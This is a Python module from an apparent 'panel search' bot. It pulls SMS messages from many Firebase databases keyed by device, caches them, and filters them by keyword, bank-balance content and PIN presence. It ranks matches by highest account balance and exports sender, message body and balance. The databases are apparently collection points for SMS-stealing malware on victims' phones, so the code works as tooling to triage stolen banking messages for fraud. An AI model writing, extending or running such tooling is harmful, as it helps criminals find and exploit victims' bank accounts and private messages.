from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from datetime import datetime

from sqlalchemy.orm import Session

from panel_search_bot.database import SessionLocal
from panel_search_bot.firebase_fetch import fetch_many
from panel_search_bot.models import CachedSms, FirebaseDb
from panel_search_bot.config import get_settings
from panel_search_bot.services import (
    firebase_ids_recently_offline,
    firebase_ids_with_cache,
    load_cached_sms,
    load_cached_sms_for_keywords,
    match_keywords,
    update_firebase_status,
    upsert_cached_sms,
    wants_bank_filter,
    within_days,
)
from panel_search_bot.firebase_urls import device_id_from_raw_path, firebase_db_label
from panel_search_bot.sms_parser import effective_message_at, is_bank_balance_sms, is_junk_sms


@dataclass
class SearchParams:
    keywords: list[str]
    mode: str = "online"  # online | offline | both
    balance_sort: str = "high"  # high | low | skip
    days: int | None = None  # None = all time
    pin_filter: str = "both"  # with | without | both


@dataclass
class SearchMatch:
    firebase_url: str
    sender: str
    body: str
    message_at: datetime | None
    balance: float | None
    has_pin: bool
    source: str  # live | cache
    device_id: str = ""
    db_label: str = ""


@dataclass
class SearchResult:
    matches: list[SearchMatch] = field(default_factory=list)
    dbs_scanned: int = 0
    dbs_online: int = 0
    elapsed_sec: float = 0.0


def _pin_ok(has_pin: bool, pin_filter: str) -> bool:
    if pin_filter == "both":
        return True
    if pin_filter == "with":
        return has_pin
    return not has_pin


def _sort_matches(matches: list[SearchMatch], balance_sort: str) -> list[SearchMatch]:
    if balance_sort == "skip":
        return sorted(matches, key=lambda m: m.message_at or datetime.min, reverse=True)
    reverse = balance_sort == "high"

    def key(m: SearchMatch):
        bal = m.balance if m.balance is not None else (-1 if reverse else 1e18)
        return (bal, m.message_at or datetime.min)

    return sorted(matches, key=key, reverse=reverse)


def _balance_in_range(balance: float | None, balance_sort: str) -> bool:
    if balance_sort == "skip":
        return True
    if balance is None:
        return False
    settings = get_settings()
    if balance_sort == "high":
        return settings.panel_search_balance_high_min <= balance <= settings.panel_search_balance_high_max
    if balance_sort == "low":
        return balance >= settings.panel_search_balance_low_min
    return True


def _filter_row(
    sender: str,
    body: str,
    message_at: datetime | None,
    balance: float | None,
    has_pin: bool,
    params: SearchParams,
) -> bool:
    if is_junk_sms(body, sender):
        return False
    blob = f"{sender} {body}"
    if not match_keywords(blob, params.keywords):
        return False
    if wants_bank_filter(params.keywords):
        if not is_bank_balance_sms(body, sender):
            return False
    if not _pin_ok(has_pin, params.pin_filter):
        return False
    msg_when = effective_message_at(message_at, body)
    if not within_days(msg_when, params.days):
        return False
    if not _balance_in_range(balance, params.balance_sort):
        return False
    return True


def match_from_cache_row(url: str, row) -> SearchMatch:
    from panel_search_bot.sms_parser import parse_balance

    balance = row.balance_value if row.balance_value is not None else parse_balance(row.body)
    msg_at = effective_message_at(row.message_at, row.body)
    device = device_id_from_raw_path(row.raw_path or "")
    if device == "unknown" and row.device_key and not row.device_key.startswith("http"):
        device = row.device_key[:128]
    return SearchMatch(
        firebase_url=url,
        db_label=firebase_db_label(url),
        device_id=device,
        sender=row.sender,
        body=row.body,
        message_at=msg_at,
        balance=balance,
        has_pin=row.has_pin,
        source="cache",
    )


def match_from_live_item(url: str, item: dict) -> SearchMatch:
    body = item.get("body", "")
    return SearchMatch(
        firebase_url=url,
        db_label=firebase_db_label(url),
        device_id=str(
            item.get("device_id") or device_id_from_raw_path(str(item.get("raw_path", "")))
        ),
        sender=item.get("sender", ""),
        body=body,
        message_at=effective_message_at(item.get("message_at"), body),
        balance=item.get("balance"),
        has_pin=item.get("has_pin", False),
        source="live",
    )


def format_result_file(matches: list[SearchMatch], params: SearchParams) -> str:
    lines = [
        "# Panel Search export",
        f"# keywords: {', '.join(params.keywords)}",
        f"# mode: {params.mode} | sort: {params.balance_sort} | days: {params.days or 'all'}",
        "",
    ]
    for index, m in enumerate(matches, start=1):
        ts = m.message_at.isoformat(sep=" ", timespec="seconds") if m.message_at else "unknown-time"
        bal = f"{m.balance:.2f}" if m.balance is not None else "-"
        lines.append(f"--- #{index} | {m.firebase_url} | {ts} | bal={bal} | pin={m.has_pin} ---")
        lines.append(f"From: {m.sender}")
        lines.append(m.body)
        lines.append("")
    return "\n".join(lines)


def _apply_live_refresh(
    db: Session,
    firebase_rows: list[FirebaseDb],
    live: dict[str, tuple[bool, list[dict], str]],
    url_to_row: dict[str, FirebaseDb],
    result: SearchResult,
) -> set[int]:
    """Fetch se cache update + kaunse DB abhi online hain."""
    live_online: set[int] = set()
    for url, (online, sms_list, _resolved) in live.items():
        row = url_to_row.get(url)
        if not row:
            continue
        has_data = bool(sms_list)
        if online and has_data:
            result.dbs_online += 1
        if has_data:
            upsert_cached_sms(db, row.id, row.url_normalized, sms_list)
        update_firebase_status(db, row.id, online or has_data)
        if online or has_data:
            live_online.add(row.id)
    return live_online


def _db_ids_for_mode(
    db: Session,
    firebase_rows: list[FirebaseDb],
    *,
    mode: str,
    live_online: set[int],
) -> list[int]:
    """Online = sirf online DBs ki cache; offline = dead/offline; both = sab jahan cache hai."""
    all_ids = [r.id for r in firebase_rows]
    if mode == "both":
        return list(firebase_ids_with_cache(db, all_ids))

    status_rows = (
        db.query(FirebaseDb.id, FirebaseDb.is_online).filter(FirebaseDb.id.in_(all_ids)).all()
    )
    online_ids: list[int] = []
    offline_ids: list[int] = []
    for fb_id, is_online in status_rows:
        if is_online is True or fb_id in live_online:
            online_ids.append(fb_id)
        elif is_online is False:
            offline_ids.append(fb_id)

    if mode == "online":
        if not online_ids and live_online:
            online_ids = list(live_online)
        return online_ids

    # offline — sirf explicitly offline (unknown/null skip unless live ne online kiya)
    return offline_ids


def _matches_from_cache(
    db: Session,
    firebase_db_ids: list[int],
    params: SearchParams,
) -> list[SearchMatch]:
    if not firebase_db_ids:
        return []
    matches: list[SearchMatch] = []
    fb_url: dict[int, str] = {
        r.id: r.url_normalized
        for r in db.query(FirebaseDb).filter(FirebaseDb.id.in_(firebase_db_ids)).all()
    }
    for row in load_cached_sms_for_keywords(db, firebase_db_ids, params.keywords):
        url = fb_url.get(row.firebase_db_id, "unknown")
        if _filter_row(row.sender, row.body, row.message_at, row.balance_value, row.has_pin, params):
            matches.append(match_from_cache_row(url, row))
    return matches


def _dedupe_matches(matches: list[SearchMatch]) -> list[SearchMatch]:
    seen: set[tuple] = set()
    unique: list[SearchMatch] = []
    for m in matches:
        key = (m.firebase_url, m.device_id, m.body[:200], m.message_at)
        if key in seen:
            continue
        seen.add(key)
        unique.append(m)
    return unique


def _finalize_search(
    firebase_rows: list[FirebaseDb],
    params: SearchParams,
    live: dict[str, tuple[bool, list[dict], str]],
    skipped_cached: set[str],
) -> SearchResult:
    del skipped_cached  # cache pass ab mode se decide hota hai
    db = SessionLocal()
    started = time.time()
    url_to_row = {row.url_normalized: row for row in firebase_rows}
    urls = list(url_to_row.keys())
    result = SearchResult(dbs_scanned=len(urls))

    try:
        live_online: set[int] = set()
        if live:
            live_online = _apply_live_refresh(db, firebase_rows, live, url_to_row, result)

        search_ids = _db_ids_for_mode(db, firebase_rows, mode=params.mode, live_online=live_online)
        matches = _matches_from_cache(db, search_ids, params)

        if params.mode == "both":
            matches = _dedupe_matches(matches)

        result.matches = _sort_matches(matches, params.balance_sort)
        result.elapsed_sec = time.time() - started
        return result
    finally:
        db.close()


async def run_search(
    db: Session,
    firebase_rows: list[FirebaseDb],
    params: SearchParams,
    *,
    cancel_event: asyncio.Event | None = None,
    on_progress=None,
) -> SearchResult:
    del db  # use thread-local SessionLocal for SQLite work
    started = time.time()
    url_to_row = {row.url_normalized: row for row in firebase_rows}
    urls = list(url_to_row.keys())

    if not urls:
        return SearchResult()

    if params.mode not in ("online", "both"):
        return await asyncio.to_thread(_finalize_search, firebase_rows, params, {}, set())

    settings = get_settings()
    fetch_urls = list(urls)
    skipped_cached: set[str] = set()
    skipped_offline: set[str] = set()
    skipped_n = 0

    if on_progress:
        await on_progress(0, len(urls), "init", True, 0, "Scan shuru…")

    def _cached_ids() -> set[int]:
        session = SessionLocal()
        try:
            return firebase_ids_with_cache(session, [row.id for row in firebase_rows])
        finally:
            session.close()

    def _offline_ids() -> set[int]:
        session = SessionLocal()
        try:
            return firebase_ids_recently_offline(
                session, [row.id for row in firebase_rows], settings.panel_search_skip_offline_hours
            )
        finally:
            session.close()

    cached_ids = await asyncio.to_thread(_cached_ids)

    offline_ids = await asyncio.to_thread(_offline_ids)
    if offline_ids and settings.panel_search_skip_offline_hours > 0:
        # Skip live fetch only when we already have SMS cached for that DB (avoid 1s / 0-match VPS scans).
        skipped_offline = {
            u for u in urls if url_to_row[u].id in offline_ids and url_to_row[u].id in cached_ids
        }
        fetch_urls = [u for u in fetch_urls if u not in skipped_offline]

    # Cached DBs hold most SMS; skipping live is OK for both/offline (cache pass runs below).
    # For online-only + day filter, still skip live on cache — dates are often missing in cache anyway.
    has_cache = len(cached_ids) >= settings.panel_search_min_cached_dbs_for_fast_both

    # Online: hamesha live refresh taaki online/offline status + cache fresh rahe
    if settings.panel_search_skip_live_if_cached and cached_ids and params.mode != "online":
        skipped_cached = {u for u in urls if url_to_row[u].id in cached_ids}
        fetch_urls = [u for u in fetch_urls if u not in skipped_cached]
        skipped_n = len(skipped_cached)

    base_skip = len(skipped_offline)
    live_total = len(fetch_urls)
    if on_progress and base_skip:
        await on_progress(
            base_skip,
            len(urls),
            "skip-offline",
            True,
            0,
            f"⏭ {base_skip} dead/offline skip (pehle scan)",
        )

    if on_progress:
        if skipped_n and live_total:
            await on_progress(
                skipped_n,
                len(urls),
                "live-fetch",
                True,
                0,
                f"⏭ {skipped_n} cached skip · live fetch {live_total} DBs…",
            )
        elif skipped_n and not live_total:
            await on_progress(skipped_n, len(urls), "cache-only", True, 0, "All cached — matching…")

    async def progress(done, _total, url, online, sms_count, resolved):
        if on_progress:
            await on_progress(
                base_skip + skipped_n + done, len(urls), url, online, sms_count, resolved
            )

    # "Both" with big cache: live sirf uncached; warna poora live (VPS pe 0-match bug fix).
    if (
        params.mode == "both"
        and settings.panel_search_both_skip_uncached_live
        and has_cache
    ):
        fetch_urls = [u for u in urls if url_to_row[u].id not in cached_ids and u not in skipped_offline]
        skipped_n = len({u for u in urls if url_to_row[u].id in cached_ids})

    if params.mode == "online":
        fetch_urls = [u for u in urls if u not in skipped_offline]
        skipped_cached = set()
        skipped_n = 0

    if not fetch_urls and params.mode in ("online", "both"):
        uncached = [u for u in urls if url_to_row[u].id not in cached_ids]
        fetch_urls = uncached if uncached else list(urls)
        skipped_offline = set()
        base_skip = 0

    live: dict[str, tuple[bool, list[dict], str]] = {}
    if fetch_urls:
        if cancel_event and cancel_event.is_set():
            return SearchResult()
        import time as _time

        deadline = _time.monotonic() + settings.panel_search_max_scan_sec
        live = await fetch_many(
            fetch_urls, on_progress=progress, cancel_event=cancel_event, deadline=deadline
        )

    if cancel_event and cancel_event.is_set():
        return SearchResult(elapsed_sec=time.time() - started)

    if on_progress:
        await on_progress(len(urls), len(urls), "finalize", True, 0, "Matching & saving…")

    result = await asyncio.to_thread(_finalize_search, firebase_rows, params, live, skipped_cached)
    result.elapsed_sec = time.time() - started
    return result
